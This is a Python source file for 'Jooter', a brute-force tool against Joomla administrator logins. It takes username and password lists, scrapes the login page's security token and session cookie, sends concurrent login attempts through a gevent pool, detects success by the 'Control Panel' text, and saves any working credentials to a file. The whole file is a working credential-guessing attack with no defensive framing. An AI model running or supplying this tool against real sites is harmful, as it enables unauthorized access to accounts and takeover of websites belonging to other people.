import logging
import time
import hashlib
import urllib
import urllib2
import sys
import requests
import re

from progressbar import AnimatedMarker, Bar, BouncingBar, Counter, ETA, \
	FileTransferSpeed, FormatLabel, Percentage, \
    ProgressBar, ReverseBar, RotatingMarker, \
    SimpleProgress, Timer

from gevent.pool import Pool
import gevent
from gevent import monkey
monkey.patch_socket()

class Jooter:
	def __init__(self, url, ufile, pfile, level="INFO"):
		self.__log = self.__grabLogger(level)
		self.__url = url
		self.__ufile = ufile
		self.__pfile = pfile
		self.__ulist = []
		self.__plist = []
		self.__pool = 15
		self.__success = False

		self.__processLists()
		self.__pbar = ProgressBar(widgets=[Percentage(), Bar(), ETA()], maxval=len(self.__plist))

	def __grabLogger(self, level):
		log = logging.getLogger(self.__class__.__name__)
		if level == "INFO":
			logging.basicConfig(level=logging.INFO)
		elif level == "DEBUG":
			logging.basicConfig(level=logging.DEBUG)
		elif level == "ERROR":
			logging.basicConfig(level=logging.ERROR)
		else:
			pass

		return log

	def __processLists(self):
		try:
			f = open(self.__ufile, "r")
			lines = f.readlines()
			f.close()
			self.__ulist = [x.strip() for x in lines]
			self.__log.debug("USER list processed")
		except:
			self.__log.error("Failed to process the USER list")	

		try:
			f = open(self.__pfile, "r")
			lines = f.readlines()
			f.close()	
			self.__plist = [x.strip() for x in lines]
			self.__log.debug("PASSWORD list processed")
		except:
			self.__log.error("Failed to process the PASSWORD list")
			sys.exit(1)
			
		self.__log.info("Lists processed")

	def __findHash(self, response):
		p = re.compile('.[0-9a-f]{32}.')
		hash = p.search(response)
		if hash != None:
			token = hash.group()[1:len(hash.group())-1]
			self.__log.debug("Security token found: %s" % token)
			return token
		else:
			self.__log.error("Security token wasn't found, is this a Joomla page?")
			sys.exit(1)

	def __refreshToken(self):
		response = urllib2.urlopen(self.__url)
		cookie = response.headers.get('Set-Cookie')
		token = self.__findHash(response.read())
		self.__pbar.update(self.__rcount)
		return [cookie, token]

	def __makeAttempt(self, user, passwd):
		cookie, token = self.__refreshToken()
		payload = { 'username':user, 'passwd':passwd, 'lang':'', 'option':'com_login', 'task':'login'}
		payload[token] = 1
		self.__log.debug("Payload constructed: %s" % payload)
		data = urllib.urlencode(payload)
		req = urllib2.Request(self.__url,data)
		req.add_header('cookie', cookie)
		self.__log.debug("Before request with %s:%s" % (user, passwd))
		content = urllib2.urlopen(req).read()
		self.__log.debug("After request with %s:%s" % (user, passwd))

		p = re.compile('.Control Panel.')
		found = p.search(content)
		if found != None:
			self.__success = True
			self.__credentials = (user,passwd)
			self.__log.debug("Success with %s:%s" % (user, passwd))
			f = open("success","w")
			f.write("%s:%s" % (user,passwd))
			f.close()
		else:
			self.__log.debug("Failed with %s:%s" % (user, passwd))

	def scan(self):
		self.__log.info("Scan started")
		pool = Pool(self.__pool)
		start = time.time()
		self.__log.debug("Scan started at %s" % start)

		for user in self.__ulist:
			jobs = []
			self.__rcount = 0
			self.__pbar.start()
			for passwd in self.__plist:
				jobs.append(pool.spawn(self.__makeAttempt, user, passwd))
				self.__rcount += 1
			self.__pbar.finish()
			gevent.joinall(jobs)
		
		end = time.time()
		self.__log.debug("Scan ended at %s" % end)
		total = end - start
		self.__log.info("Total scan time: %s" % total)

		if self.__success:
			return self.__credentials
